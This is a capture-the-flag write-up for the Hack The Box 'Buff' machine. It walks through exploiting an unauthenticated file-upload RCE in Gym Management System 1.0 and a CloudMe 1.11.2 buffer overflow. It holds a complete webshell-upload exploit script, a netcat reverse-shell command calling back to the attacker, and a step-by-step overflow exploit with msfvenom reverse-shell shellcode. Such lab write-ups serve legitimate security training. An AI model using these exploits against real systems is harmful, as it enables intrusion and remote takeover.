# Buff Writeup
![Buff](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Buff.png)

**Keyword summary:**

- CloudMe Buffer overflow exploitation.
- RCE Gym Management System

# Enumeration
We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
This can be done as follows:
```bash
nmap -p- --max-retries --scan-delay -sS --min-rate 5000 -vvv -n -Pn [IP] 
```
Replace '[IP]' with the IP address to be scanned

We will see that the open ports are:

- 7680/tcp tcpwrapped
- 8080/tcp http

now we can do:
```bash
nmap -sCV -p7680,8080 [IP]
```

![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Ports.PNG)


We can then proceed by checking the web page that is hosted on port 8080 of the machine.

![Pagina](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Captura.PNG)

After reviewing all sections of the website, we have not found anything interesting, except for a message in the "Contacts" section that mentions:

-_"Made with Gym Management Software 1.0."_

However, we will look at this later

For now we are going to use the **WFUZZ** tool to perform a search of the possible directories that are in the target IP address
```bash
wfuzz --hc=404 -w [wordlist path] http://[IP]:8080/FUZZ
```

![Upload](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Upload%20directory.PNG)

As you can see, something that may interest us is that there is an *"upload"* directory. 
_(We will use this directory later)_

# Foothold
****
Let's go back to the message in the "Contacts" section that mentions:
-_"Made with Gym Management Software 1.0."_
**That is a nice hint!**

Because we can look for possible vulnerabilities reported about this software.
Take a look at this code about Remote Code Execution without Authentication in the "Gym Management System 1.0" software.

**https://www.exploit-db.com/exploits/48506**

The script allows to perform an unauthorized file upload a (.php file). 
Once the php file is uploaded, using the "telepathy" parameter that acts on HTTP requests, remote command execution (RCE) is allowed.

This works because the system doesn't perform a proper validation of the uploaded files. Instead of verifying the type and integrity of the uploaded files, it simply allows any file to be uploaded.


**One thing to note is that the script is in python2.**
**Therefore, it must be run using the python2 command.**
**Or, failing that, use tools like "2to3" to pass it to python3.**
**However, here below you will find the script working in python3 after passing it through "2to3" and making some corrections.**


`(python3 script - Gym Management System 1.0 - Unauthenticated Remote Code Execution)`
```python3
import requests
import sys
import urllib
import re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET


if __name__ == "__main__":
   
    if len(sys.argv) != 2:
        print (formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0]))
        print (formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0]))
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
```

Once the above script has been executed we should be able to have a command execution through the browser

![Kamehameha](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/kamehameha.PNG)

Now in order to get the "user flag" we need to get access to the system, one of the possible ways to do this is by getting a "reverse shell". 

This can be accomplished in the following way:
Since the target machine does not have netcat, we are going to provide an smb server whose folder will host a netcat executable.

https://eternallybored.org/misc/netcat/ (Download and unzip netcat for windows in your linux system)

Now, in the folder where the unzipped netcat is located, let's execute the command:
```bash
smbserver.py smbFolder $(pwd) -smb2support
```
![Smbserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/smbserver.PNG)

In this way we will go to the search engine and make the following request:
```bash
...?telepathy=dir \\[Our IP]\smbFolder
```
Thus, we will see that the items that are part of the netcat folder will be listed 

![dir smb](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dir%20smb.PNG)

Now, in our linux environment, we will listen in on port [PORT]
```bash
nc -lvnp [PORT]
```
So, let's ask for a "reverse shell" by executing the following request in the browser:
```bash
...?telepathy=\\[Our IP]\smbFolder\nc.exe -e cmd [Our IP] [PORT]
```
![reverse_shell](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/reverse_shell.PNG)


The user flag is located at:
```
...cd C:\Users\shaun\Desktop
```
```
...type user.txt
```
```: XXXXXXXXXXXXXXXXXXXXXXX```



# Buffer Overflow Exploitation and Privilege Escalation
****
For this part i will be using a Windows Environment to fully understand the Buffer Overflow, however, this step is "not completely necessary" but I recommend to do it to fully understand how the whole process around the exploitation of the Buffer Overflow and subsequent Privilege Escalation on this machine works.

**But First:**
Once we have the reverse shell, we will go to the 'C:\Windows\Temp' directory
Once there, we will make a "Recon" directory and upload a WinPEAS.exe file to the machine. This will help us to enumerate the system

we can download WinPEAS from: https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f

We are able to upload the WinPEAS.exe file by serving an http.server on our linux machine, then, using the "curl" tool, downloading winPEAS
```bash
[Our linux system]python3 -m http.server 80
```

```bash
[Target windows system]curl -o winPEAS.exe http://[OURIP]/winPEAS.exe
```
![pythonclient](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/pythonclient.PNG)
![pythonserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/pythonserver.PNG)

Once we got the WinPEAS in the target machine, we are going to execute it with the command:
```cmd
winPEAS.exe
```

We can see something interesting in the winPEAS.exe output 
![winpeas](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/winpeas.PNG)
a "C:\Users\shaun\Downloads\Cloudme_1112.exe"

¿What is Cloudme? [https://en.wikipedia.org/wiki/CloudMe]

We can think that if the user "shaun" downloaded the CloudMe software, this service may be running on the machine.
How can we check this?
We can do a "CloudMe default port" search and we can see that:
_"CloudMe Sync is a synchronization application that synchronizes your local storage with cloud storage, and is listening on port 8888"_

![cloudmePORT](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/CloudMePORT.PNG)

The service is indeed active listening on port 8888 of the machine!
So, what can we do?

```bash
searchsploit cloudme
```
searchsploit shows us a Buffer overflow exploit where CloudMe version 1.11.2 is vulnerable

![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/searchsploit.PNG)

We can examine the code. we can see that the exploit runs the Windows calculator. So we could make some changes and run the exploit directly and **terminate the machine.**

However, here I will show how to exploit the vulnerability step by step from scratch.

# Origin of the exploit, why and how does it work?
****
```
[From now on when I mention "the Windows machine" I am referring to our virtual 
machine where we are going to analyze the whole process]. It is necessary that 
we have easy access to the [Linux IP] (Attacker) and the [Windows IP] (Target).
```

Then to analyze the whole process, it is necessary to register with a free account and have downloaded on a Windows VM, the version of CloudMe (1.11.2).

**https://www.cloudme.com/en/signup/**

**https://cloudme.com/downloads/CloudMe_1112.exe**
In addition, in our Windows system it is necessary that we have installed the following:
- **Chisel** | (https://github.com/jpillora/chisel/releases/tag/v1.9.1)
- **Immunity Debugger** | (https://www.immunityinc.com/products/debugger/)
- **7Zip** | (https://www.7-zip.org/download.html)

We should see something like this on our Windows machine:
![cloudmewin](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/cloudmewin.PNG)

With Chisel we are going to create a private tunnel in which we are going to make port 8888 of our remote machine [Windows] accessible. (We will need to have chisel on our linux machine and our windows machine.) **[reverse port forwarding]**

Chisel will act for us as follows:

- [Linux machine]: Chisel Server
- [Windows machine]: Chisel Client

To establish this, in our Linux machine (Attacker) we will execute in the directory where chisel is located:
```bash
./chisel server --reverse -p [PORT]
```
![chiselserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselserver.PNG)

To establish this, in our Windows machine (Target) we will execute in the directory where chisel is located:
(Here, "PORT" has to be the same as in the previous command)
```bash
./chisel.exe client [Linux IP]:[PORT] R:8888:127.0.0.1:8888
```
![chiselclient](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselclient.PNG)

**These commands indicate that traffic received on port 8888 on the Windows machine will be redirected through the tunnel created by Chisel to port 8888 on the Linux machine.** 

Now we will be working on the following python3 script
```python3
#!/usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print("\n\n[!]Exiting...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Global
ip_address = "127.0.0.1"
payload = b""

def makeConnection(): #This is the core, here we want to achieve the Buffer Overflow to achieve RCE.

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)


if __name__ == '__main__':

    makeConnection()
```
How do we know what ```payload = b""``` should contain?
First we are going to send a line of 5000 characters "A", this by
```
"payload" = b"A"*5000
```
When running the exploit, we will see that the "CloudMe" service in the virtual machine will stop.
**In this way we have verified that the service is vulnerable to Buffer Overflow.**

Now, with **_immunity debugger_**, let's see what is supposed to happen when the payload is sent to the program.

Let's attach the CloudMe process by clicking on file --> attach

![Immunityattach](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Immunityattach.png)

We can see at the bottom left that the process will be "paused", so we will click on the "Run Program" button or press "F9" for Run the Program

So let's run the exploit again and see what happens.



![414141](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/41414141.png)
CloudMe by not sanitizing the user input, the user is able to send a payload that exceeds the amount of bytes reserved in the Buffer for the user input. Thus, the payload escapes the allocated buffer frame by overwriting other adjacent areas of memory.

So the program is paused because "EIP" points the program flow to an address that does not exist (0x414141).

![buffer](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/buffer.png)
(Image taken from: https://www.davidromerotrejo.com/2018/09/buffer-overflow-attack.html)
In this image, "RET" refers to "EIP" in Immunity Debugger.

So, as attackers, **what is our target?.**
**Well, we need to know the exact number of characters we must send in the payload in order to overwrite the "EIP".**

For this we will make use of the tool ```pattern_create.rb```:

On Kali Linux this is located in the path: 
- /usr/share/metasploit-framework.

In my case, in ArchLinux we will find it in the path: 
- /opt/metasploit/tools/exploit/pattern_create.rb


```
/opt/metasploit/tools/exploit/pattern_create.rb -l 5000

> Aa0AalAa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9AC0AC1AC2AC3A...<SNIP>
```
Now instead of sending "A" characters, we are going to enter this string of characters through the payload 
```
[exploit script]
#Global
ip_address = "127.0.0.1"
"payload" = b"[PUT HERE THE CHARACTER STRING]"
```
This will be useful, because the characters of this string are specially defined and we will be able to know at which exact point the "EIP" will be overwritten. 
This exact point is called **"offset"**

```Note: It is necessary to close and open the CloudMe service on the Windows machine [Target], open Immunity Debugger again and attach the CloudMe service.```

So let's run the exploit again

![316A4230](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/316A4230.png)

EIP = 316A4230
[https://es.wikipedia.org/wiki/Endianness]

The string '316A4230' being in 32-Bits is in Little Endian. We should separate it into pairs and reverse it from right to left:
-->  31 6A 42 30 = 30 42 6A 31

Now the string "30 42 6A 31" is a hexadecimal string
```
echo -n "30426A31" | xxd -ps -r; echo
> 0Bj1
```
The command prints the hexadecimal string "30426A31" (xxd -ps -r) converts this hexadecimal string into a text string. Finally
We can see in which part of the created pattern the string "0Bj1" is located.
```
/opt/metasploit/tools/exploit/pattern_create.rb -l 5000 | grep "0Bj1" --color
```
> 0BilBi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj```0Bj1```Bj2Bj3Bj4Bj5Bj6...<SNIP>

Then the string "0Bj1" corresponds to what is overwritten in "EIP", so we know how many characters we have to enter until we take control of the EIP.

```
/opt/metasploit/tools/exploit/pattern_offset.rb -q 0x316A4230
> [*] Exact match at offset 1052
```
Thus, the offset corresponds to 1052 characters.
In this way, we will verify that what we are seeing is actually happening.

We define a variable offset = 1052
[See the code]
In addition, we have defined the variables:
before_EIP
EIP
after_EIP

```python3
#!/usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print("\n\n[!]Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Global
ip_address = "127.0.0.1"
offset = 1052
before_EIP = b"A" * offset
EIP = b"B"*4 #We put "4" B, since the format is 4 bytes.
after_EIP = b"C"*500 #To see where the data is being deposited after EIP

payload = before_EIP + EIP + after_EIP



def makeConnection(): 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)


if __name__ == '__main__':

    makeConnection()
```
We run the script and see that the EIP is pointing to the process **"0x4242424242".**
This corresponds to "BBBB"

![42424242](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/42424242.png)

And we can see that in the "ESP" section the "C" characters are being stored.
By right-clicking on the ESP, we can click on "Follow in Dump"

![ESP1](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/ESP1.png)


And we can see that right after the EIP "BBBB", the "C" characters are being stored in the ESP.

![ESP2](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/ESP2.png)

Then, we could control the flow of the program in the EIP.
So instead of placing "C" we could load malicious instructions into the program.

However, for this, we cannot simply place the address of the ESP in our "EIP" payload, what we must do is point to an address that does it for us.

**How do we know which address would do this?**

### Badchars
****
First we must check which characters are interpreted by the program and which are not.
**Because not all programs interpret all characters**

```Note: It is necessary to close and open the CloudMe service on the Windows machine [Target], open Immunity Debugger again and attach the CloudMe service.```

So let's use [!mona] in Immunity Debugger to find those addresses that jump to the ESP

https://raw.githubusercontent.com/corelan/mona/master/mona.py
>Copy and paste the contents of the above github address into a mona.py.txt file
Change the extension to ".py".
Drag the file mona.py to the path "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\".

Now, with mona we can create a "**_ByteArray_**" by inserting commands in Immunity Debugger command line 
```sh
!mona config -set workingfolder C:\[AnyPATH]\%p
!mona bytearray
```
Now, we can see a CloudMe directory in the path we have chosen with a **_ByteArray_**

This **_ByteArray_** can be used to see which characters the "CloudMe" service accepts or does not accept **[Badchars]**.

>[[Make sure to delete all the output above the bytearray].

![bytearray](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/bytearray.png)

We can quickly transfer the ByteArray.txt file to our Linux machine by establishing a "smbserver" like we did before and on our Windows machine by putting the ip address by accessing the "smbFolder" directory

```bash
smbserver.py smbFolder $(pwd) -smb2support
```
![smbFolder](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/smbFolder.png)

Now, within the python exploit, we are momentarily going to define a variable and we will remove "after_EIP"
```badchars = (b"\x00\x01\x02\x03\x0..<SNIP>``` #each line of the ByteArray must begin with b"...
and we are going to define payload
```payload = before_EIP + EIP + badchars```

Thus the content of “badchars” will be stored in the “ESP” region.

**Execute the exploit**

By right-clicking on the ESP, we can click on "Follow in Dump"


![bytearraydump](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/bytearraydump.png)

We can see here those characters that the software allows
It is advisable most of the time to remove the [00] character. If by chance any character does not appear, it means that the program does not accept it. Thus, it will be necessary to remove this character and try again by sending the script, and check for any other character that may appear. In this case, all characters are accepted.

Now that we've checked those characters accepted or not accepted by the software,
let's proceed to send specific instructions.

### Using Nasm_Shell.
***

Now, using Nasm_Shell, we will try to discover any address where an 'OP Code' is being applied.

```bash
/opt/metasploit/tools/exploit/nasm_shell.rb
nasm> jmp ESP
nasm> 00000000 FFE4           jmp esp
```
The instruction is --> **\xFF\xE4**

Our interest will be to search for any address containing \xFF\xE4, which translates to **'jmp esp'**

On our Windows machine, we will go to the Immunity Debugger

```Note: It is necessary to close and open the CloudMe service on the Windows machine [Target], open Immunity Debugger again and attach the CloudMe service.```

There, we will execute in the command line:"
```bash
!mona modules
```

Here, we will see the modules loaded in the running process. 
Those modules that have the value "False" in all columns will be of interest to us

![dllmodule](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dllmodule.PNG)

Here we will see a dll file called "Qt5Core.dll". This module is potentially useful to check if it contains any address that, at the level of OP Code, contains an instruction 'jmp esp'.
Let's execute at the Immunity Debugger command line:
```sh
!mona find -s "\xFF\xE4" -m Qt5Core.dll
```
![execute_read](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/execute_read.PNG)

Now, we can see that this address **'0x68a98a7b'** executes a 'jmp esp'.
And there are **'Execute_Read'** privileges on this address, which are necessary in the sense that this will allow us to execute our commands.


We will go to section 'c' in the top bar, and there we will click on the icon:

![icono](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/icono.PNG)

Next, we will input the address '0x68a98a7b'.

Now, as we want the program flow to go to the 'ESP' because this is where we want to execute commands, it is of interest to us that 'EIP' points to the address '0x68a98a7b'.

So, to verify this, by clicking on the address '0x68a98a7b', we will press [F2] to set a breakpoint.
![breakpoint](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/breakpoint.PNG)

Once the breakpoint is set, we need to execute our exploit.
Our exploit should look like this so far:

```python3
#!/usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print("\n\n[!]Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Global
ip_address = "127.0.0.1"
offset = 1052
before_EIP = b"A" * offset
EIP = b"\x7b\x8a\xa9\x68" # 0x68a98a7b

badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_EIP + EIP + badchars



def makeConnection(): 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)


if __name__ == '__main__':

    makeConnection()
```


**Note that** ```EIP = b"\x7b\x8a\xa9\x68" # 0x68a98a7b```
**It is written in reverse due to the little-endian format.**
**With this code, we are going to validate if "EIP" indeed points to "ESP".**

![EIPESP](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/EIPESP.PNG)


So, we have verified that indeed, EIP holds the address of ESP. Now, pay attention that by clicking on the icon (Step into) or pressing [F7], the program flow goes to the address of ESP. And what is stored in ESP? For now, those values associated with our variable "badchars".

![caracteresESP](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/caracteresESP.PNG)

Now, the interesting thing is that everything stored in "ESP" will be executed due to the **Execute_Read** privileges.
Now what we will do is, using the msfvenom tool, generate a shellcode that points to our address, sending a direct console directive
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[HOST] LPORT=[PORT] --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread
>"\xd9\xc1\xba\x7f\xec\x04\x65\xd 5\xd9\xb1\x52\x31\x53\x17\x83\...<SNIP>
```

This will give us a shellcode encoded with Shikata-Ga-Nai. Therefore, when EIP points to ESP and starts reading the code, it won't be able to interpret it because it's encoded/encrypted. Hence, it's necessary to add a series of "NOPs" characters to the script to give the program time to decrypt the sent code.

So we will add a variable 'nops' to the code.
```
nops = b"\x90" * 20
```
Now then, the complete code will be:

```python3
#!/usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print("\n\n[!]Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Global
ip_address = "127.0.0.1"
offset = 1052
before_EIP = b"A" * offset
EIP = b"\x7b\x8a\xa9\x68" # 0x68a98a7b
nops = b"\x90" * 20

shellcode = (b"\xda\xc4\xbf\xba\x41\x96\x88\xd9\x74\x24\xf4\x5d\x31\xc9" # msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread
b"\xb1\x52\x83\xed\xfc\x31\x7d\x13\x03\xc7\x52\x74\x7d\xcb"
b"\xbd\xfa\x7e\x33\x3e\x9b\xf7\xd6\x0f\x9b\x6c\x93\x20\x2b"
b"\xe6\xf1\xcc\xc0\xaa\xe1\x47\xa4\x62\x06\xef\x03\x55\x29"
b"\xf0\x38\xa5\x28\x72\x43\xfa\x8a\x4b\x8c\x0f\xcb\x8c\xf1"
b"\xe2\x99\x45\x7d\x50\x0d\xe1\xcb\x69\xa6\xb9\xda\xe9\x5b"
b"\x09\xdc\xd8\xca\x01\x87\xfa\xed\xc6\xb3\xb2\xf5\x0b\xf9"
.
.
<SNIP>

payload = before_EIP + EIP + nops + shellcode



def makeConnection(): 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)


if __name__ == '__main__':

    makeConnection()
```
![sucess](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/success.PNG)

Now, we have accessed to the target machine.


# Buffer Overflow Exploitation and Root Access
***
Now that we see how the script works, let's use it on the target machine.

So, let's generate a new shellcode with msfvenom, where the IP will now be that of the Hack The Box VPN.
```
msfvenom -p windows/shell_reverse_tcp LHOST=[HOST] LPORT=[PORT] --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread
```

Once we have the interactive shell we received from the page, just like we did when obtaining the user flag. Once we have the reverse shell, we will go to the 'C:\Windows\Temp' directory and make a "direct" directory there
```
mkdir direct
```

We'll need now to upload the Chisel file to the victim machine so that we can perform reverse port forwarding from port 8888 on the target machine [Windows] to our IP on port 8888.

We can download the Windows executable for Chisel from the website
(https://github.com/jpillora/chisel/releases/tag/v1.9.1)
```Note: We can verify if we are downloading a 32-bit or 64-bit file by running the command on the target machine [Windows]:"```
```
systeminfo
```

We will send the chisel.exe file to the target machine [Windows] through an http.server.

Now that we have received the chisel.exe 
Let's do the same thing we did in the **_'Origin of the exploit, why, and how does it work?'_** section

- [Linux machine]: Chisel Server
- [Windows machine]: Chisel Client

![chiselultimo](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/chiselultima.PNG)

Now we run again the exploit.

![roottxt](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/roottxt.PNG)

**Pwned.**

***


***
By: Josesito 
|
This writeup was done with the help of S4vitar's video (https://www.youtube.com/watch?v=TytUFooC3kU&t).
